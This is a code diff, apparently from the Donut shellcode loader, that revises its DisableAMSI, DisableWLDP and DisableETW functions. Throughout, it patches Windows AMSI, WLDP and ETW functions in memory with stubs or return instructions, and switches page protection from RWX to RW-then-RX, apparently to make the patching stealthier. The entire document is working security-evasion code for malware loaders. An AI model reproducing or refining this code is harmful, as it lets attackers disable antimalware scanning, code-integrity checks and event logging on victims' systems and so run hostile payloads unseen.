@@ -106,15 +106,16 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     // compiler decides to re-order functions.
     if((int)len < 0) return FALSE;
     
-    // make the memory writeable. return FALSE on error
+    // make the memory writeable (RW) for patching. return FALSE on error
     if(!inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+      cs, len, PAGE_READWRITE, &op)) return FALSE;
       
     DPRINT("Overwriting AmsiScanBuffer");
     // over write with virtual address of stub
     Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);   
-    // set memory back to original protection
-    inst->api.VirtualProtect(cs, len, op, &t);
+    // set memory to RX after patching
+    DWORD tmp;
+    inst->api.VirtualProtect(cs, len, PAGE_EXECUTE_READ, &tmp);
   
     // resolve address of AmsiScanString. if not found,
     // return FALSE because it should exist ...
@@ -131,15 +132,15 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     // compiler decides to re-order functions.
     if((int)len < 0) return FALSE;
     
-    // make the memory writeable
+    // make the memory writeable (RW) for patching. return FALSE on error
     if(!inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+      cs, len, PAGE_READWRITE, &op)) return FALSE;
       
     DPRINT("Overwriting AmsiScanString");
     // over write with virtual address of stub
     Memcpy(cs, ADR(PCHAR, AmsiScanStringStub), len);   
-    // set memory back to original protection
-    inst->api.VirtualProtect(cs, len, op, &t);
+    // set memory to RX after patching
+    inst->api.VirtualProtect(cs, len, PAGE_EXECUTE_READ, &tmp);
     
     return TRUE;
 }
@@ -168,15 +169,15 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
       Signature = (PDWORD)&cs[i];
       // is it "AMSI"?
       if(*Signature == *(PDWORD)inst->amsi) {
-        // set memory protection for write access
-        inst->api.VirtualProtect(cs, sizeof(DWORD), 
-          PAGE_EXECUTE_READWRITE, &op);
-          
+        // set memory protection for write access (RW)
+        inst->api.VirtualProtect(cs, sizeof(DWORD), PAGE_READWRITE, &op);
+        
         // change signature
         *Signature++;
         
-        // set memory back to original protection
-        inst->api.VirtualProtect(cs, sizeof(DWORD), op, &t);
+        // set memory to RX after patching
+        DWORD tmp;
+        inst->api.VirtualProtect(cs, sizeof(DWORD), PAGE_EXECUTE_READ, &tmp);
         disabled = TRUE;
         break;
       }
@@ -317,14 +318,14 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     // compiler decides to re-order functions.
     if((int)len < 0) return FALSE;
     
-    // make the memory writeable. return FALSE on error
+    // make the memory writeable (RW) for patching. return FALSE on error
     if(!inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
-      
+      cs, len, PAGE_READWRITE, &op)) return FALSE;
+    
     // overwrite with virtual address of stub
     Memcpy(cs, ADR(PCHAR, WldpQueryDynamicCodeTrustStub), len);
-    // set back to original protection
-    inst->api.VirtualProtect(cs, len, op, &t);
+    // set memory to RX after patching
+    inst->api.VirtualProtect(cs, len, PAGE_EXECUTE_READ, &t);
     
     // resolve address of WldpIsClassInApprovedList
     // if not found, return FALSE because it should exist
@@ -341,14 +342,14 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     // compiler decides to re-order functions.
     if((int)len < 0) return FALSE;
     
-    // make the memory writeable. return FALSE on error
+    // make the memory writeable (RW) for patching. return FALSE on error
     if(!inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
-      
+      cs, len, PAGE_READWRITE, &op)) return FALSE;
+    
     // overwrite with virtual address of stub
     Memcpy(cs, ADR(PCHAR, WldpIsClassInApprovedListStub), len);
-    // set back to original protection
-    inst->api.VirtualProtect(cs, len, op, &t);
+    // set memory to RX after patching
+    inst->api.VirtualProtect(cs, len, PAGE_EXECUTE_READ, &t);
     
     return TRUE;
 }
@@ -376,29 +377,29 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
     if (cs == NULL) return FALSE;
 
 #ifdef _WIN64
-    // make the memory writeable. return FALSE on error
+    // make the memory writeable (RW) for patching. return FALSE on error
     if (!inst->api.VirtualProtect(
-        cs, 1, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+        cs, 1, PAGE_READWRITE, &op)) return FALSE;
 
     DPRINT("Overwriting EtwEventWrite");
 
     // over write with "ret"
     Memcpy(cs, inst->etwRet64, 1);
 
-    // set memory back to original protection
-    inst->api.VirtualProtect(cs, 1, op, &t);
+    // set memory to RX after patching
+    inst->api.VirtualProtect(cs, 1, PAGE_EXECUTE_READ, &t);
 #else
-    // make the memory writeable. return FALSE on error
+    // make the memory writeable (RW) for patching. return FALSE on error
     if (!inst->api.VirtualProtect(
-        cs, 4, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+        cs, 4, PAGE_READWRITE, &op)) return FALSE;
 
     DPRINT("Overwriting EtwEventWrite");
 
     // over write with "ret 14h"
     Memcpy(cs, inst->etwRet32, 4);
 
-    // set memory back to original protection
-    inst->api.VirtualProtect(cs, 4, op, &t);
+    // set memory to RX after patching
+    inst->api.VirtualProtect(cs, 4, PAGE_EXECUTE_READ, &t);
 #endif
 
     return TRUE;
